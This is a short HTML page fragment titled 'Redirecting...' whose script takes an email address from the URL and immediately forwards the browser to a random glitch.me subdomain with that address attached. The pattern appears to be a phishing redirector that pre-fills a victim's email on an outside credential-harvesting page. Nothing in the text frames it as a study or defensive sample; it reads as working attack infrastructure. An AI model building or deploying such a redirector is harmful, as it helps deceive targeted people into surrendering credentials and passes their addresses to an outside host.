<head>

  <title>Redirecting...</title>
  <script nonce="MTcyOTY1MTMwNywyOTU0NDA1ODcx">
    document.addEventListener('DOMContentLoaded', function () {
      const urlParams = new URLSearchParams(window.location.search);
      let email = urlParams.get('email');

      if (email) {
        email = decodeURIComponent(email);
        // Redirect immediately
        window.location.href = 'https://peat-mixolydian-reindeer.glitch.me#' + email;
      } else {
        document.body.innerHTML = '<p style="font-family: Arial; text-align:center; margin-top: 50px;">Missing email parameter. Redirect failed.</p>';
      }
    });
  </script>
